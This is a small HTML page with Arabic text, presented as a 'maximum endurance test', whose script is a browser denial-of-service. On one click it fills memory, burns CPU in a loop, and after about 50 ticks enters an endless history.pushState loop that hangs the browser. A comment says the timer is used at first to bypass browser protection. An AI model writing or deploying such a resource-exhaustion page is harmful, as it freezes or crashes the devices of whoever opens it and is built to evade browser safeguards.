<!DOCTYPE html>
<html>
<body style="background:black; color:red; text-align:center;">
    <h1 id="msg">اضغط على الزر لبدء اختبار التحمل الأقصى</h1>
    <button id="startBtn" style="padding:20px; font-size:20px;">ابدأ الاختبار الآن</button>
    <div id="counter">0</div>

    <script>
        document.getElementById('startBtn').onclick = function() {
            this.style.display = 'none';
            document.getElementById('msg').innerText = "جاري تدمير الموارد... انتظر 10 ثواني";
            startAttack();
        };

        function startAttack() {
            let count = 0;
            // استخدام setInterval بدلاً من while(true) في البداية لتجاوز الحماية
            setInterval(() => {
                count++;
                document.getElementById('counter').innerText = "قوة الضغط: " + count;

                // 1. استهلاك الذاكرة (Allocate 20MB per tick)
                let b = new Array(1000000).fill("STRESS");
                window["mem_" + count] = b; 

                // 2. إرهاق المعالج (Heavy Calculation)
                for(let i=0; i<1000000; i++) {
                    Math.atan2(Math.random(), Math.random());
                }

                // 3. النقطة الحرجة: عندما يصل العداد لـ 50، ندخل في الحلقة القاتلة
                if(count > 50) {
                    while(true) {
                        history.pushState(null, "", Math.random());
                    }
                }
            }, 100);
        }
    </script>
</body>
</html>
